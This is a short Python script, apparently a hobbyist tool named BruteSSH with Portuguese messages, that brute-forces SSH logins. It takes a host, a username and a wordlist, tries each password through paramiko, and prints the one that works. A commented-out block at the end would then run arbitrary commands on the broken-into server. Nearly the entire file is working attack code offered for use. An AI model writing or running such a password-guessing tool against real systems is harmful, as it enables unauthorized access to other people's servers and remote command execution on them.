import paramiko
import sys

if len(sys.argv) < 2:
    print ("Criado por Jean(Kripto-Sec)")
    print ("github:https://github.com/Kripto-Sec")
    print ('\033[1;33m'+"Para usar digite python BruteSSH.py 127.0.0.1 usuario wordlist.txt"+'\033[1;33m')
    sys.exit(0)

host = sys.argv[1]
user = sys.argv[2]
arquivo = open(sys.argv[3])
linhas = arquivo.readlines()
for linha in linhas:
    try:
        fim = len(linha)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, password=linha[0:fim-1])
        print('\033[1;32m'+"[+] ==>> Senha Encontrada <<== [+]"+'\033[1;32m')
        print("[+] ==>> {} ".format(linha))
        break
    except:
        print('\033[1;31m'+"[-] Erro em >> "+'\033[1;31m'"{}".format(linha))

#while True:
#    comando = input("comando: ")
#    entrada, saida, erros = client.exec_command(comando)
#    print(saida.readlines())
#    print(erros.readlines())